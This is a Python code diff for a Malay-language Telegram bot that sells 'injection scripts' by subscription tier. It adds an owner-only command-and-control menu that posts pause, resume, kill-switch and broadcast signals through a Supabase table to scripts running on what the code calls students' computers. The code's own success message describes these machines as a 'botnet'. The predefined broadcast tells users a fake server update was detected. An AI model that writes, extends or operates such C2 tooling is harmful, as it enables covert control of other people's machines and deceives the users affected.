@@ -92,13 +92,16 @@ def get_main_menu(user_id):
     if plan == "free":
         markup.add(InlineKeyboardButton("💎 Naik Taraf (Upgrade PRO)", callback_data="cmd_upgrade"))
     
-    # Hanya Owner boleh akses Database & Sistem
+    # Hanya Owner boleh akses Database, Sistem, & C2
     if plan == "owner":
         markup.add(
             InlineKeyboardButton("👑 Panel Admin", callback_data="cmd_admin"),
             InlineKeyboardButton("📚 Pangkalan Data", callback_data="menu_db")
         )
-        markup.add(InlineKeyboardButton("🖥️ Diagnostik Sistem", callback_data="menu_system"))
+        markup.add(
+            InlineKeyboardButton("🖥️ Diagnostik Sistem", callback_data="menu_system"),
+            InlineKeyboardButton("📡 C2 Command Center", callback_data="menu_c2")
+        )
         
     markup.add(InlineKeyboardButton("❓ Panduan Pusat Kawalan", callback_data="cmd_help"))
     return markup
@@ -118,6 +121,19 @@ def get_actions_menu():
     markup.add(
         InlineKeyboardButton("💉 Dapatkan Skrip", callback_data="cmd_script"),
         InlineKeyboardButton("⚡ Tetapan Jitter", callback_data="cmd_speed")
+    )
+    markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
+    return markup
+
+def get_c2_menu():
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        InlineKeyboardButton("⏸️ Pause Semua", callback_data="c2_pause"),
+        InlineKeyboardButton("▶️ Resume Semua", callback_data="c2_resume")
+    )
+    markup.add(
+        InlineKeyboardButton("🛑 KILL SWITCH", callback_data="c2_kill"),
+        InlineKeyboardButton("📢 Broadcast Mesej", callback_data="c2_msg")
     )
     markup.add(InlineKeyboardButton("🔙 Kembali ke Utama", callback_data="cmd_main"))
     return markup
@@ -163,7 +179,7 @@ def handle_query(call):
     plan_badge = "👑 OWNER" if plan == "owner" else ("💎 PRO" if plan == "pro" else "🆓 FREE")
     
     # RBAC Guard
-    owner_only_cmds = ["menu_db", "menu_system", "cmd_fetch", "cmd_reset_confirm", "cmd_reset_execute", "cmd_ping", "cmd_admin"]
+    owner_only_cmds = ["menu_db", "menu_system", "menu_c2", "cmd_fetch", "cmd_reset_confirm", "cmd_reset_execute", "cmd_ping", "cmd_admin", "c2_pause", "c2_resume", "c2_kill", "c2_msg"]
     if call.data in owner_only_cmds and plan != "owner":
         bot.answer_callback_query(call.id, "⛔ Akses Ditolak! Ciri ini khas untuk Pemilik (Owner) sahaja.", show_alert=True)
         return
@@ -184,6 +200,37 @@ def handle_query(call):
     elif call.data == "menu_actions":
         text = "<b>⚙️ MODUL AUTOMASI & SKRIP</b>\n\n<blockquote>Dapatkan skrip suntikan terkini mengikut pelan langganan anda.</blockquote>"
         bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_actions_menu())
+
+    elif call.data == "menu_c2":
+        text = (
+            "<b>📡 C2 COMMAND CENTER</b>\n\n"
+            "<blockquote>Hantar isyarat (signal) terus kepada skrip yang sedang aktif di komputer pelajar.\n\n"
+            "<b>Amaran:</b> Arahan ini berkuatkuasa secara *Global* kepada semua pengguna.</blockquote>"
+        )
+        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=get_c2_menu())
+
+    elif call.data.startswith("c2_"):
+        action = call.data.split('_')[1].upper()
+        bot.answer_callback_query(call.id, f"Menghantar isyarat {action}...")
+        try:
+            if action == 'MSG':
+                # Basic predefined message for now, can be upgraded to accept user input
+                payload = "__CMD__|MSG|Kemas kini pelayan AINS dikesan. Sila rehat sementara waktu."
+            else:
+                payload = f"__CMD__|{action}"
+            
+            req = urllib.request.Request(f"{SUPA_URL}?title=like.__CMD__|*", method='DELETE', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}'})
+            urllib.request.urlopen(req)
+            
+            req = urllib.request.Request(SUPA_URL, method='POST', headers={'apikey': SUPA_KEY, 'Authorization': f'Bearer {SUPA_KEY}', 'Content-Type': 'application/json'}, data=json.dumps({"title": payload}).encode('utf-8'))
+            urllib.request.urlopen(req)
+            
+            text = f"<b>✅ ISYARAT DIHANTAR</b>\n\n<blockquote>Berjaya memancarkan arahan <b>{action}</b> kepada seluruh rangkaian botnet.</blockquote>"
+        except Exception as e:
+            text = f"<b>❌ GAGAL MENGHANTAR ISYARAT</b>\n\n<code>{str(e)}</code>"
+        
+        markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Kembali ke C2", callback_data="menu_c2"))
+        bot.edit_message_text(text, chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
 
     elif call.data == "menu_db":
         bot.edit_message_text("<b>📚 PANGKALAN DATA</b>\n\n<blockquote>Urus perpustakaan dan Supabase.</blockquote>", chat_id, msg_id, parse_mode="HTML", reply_markup=get_db_menu())
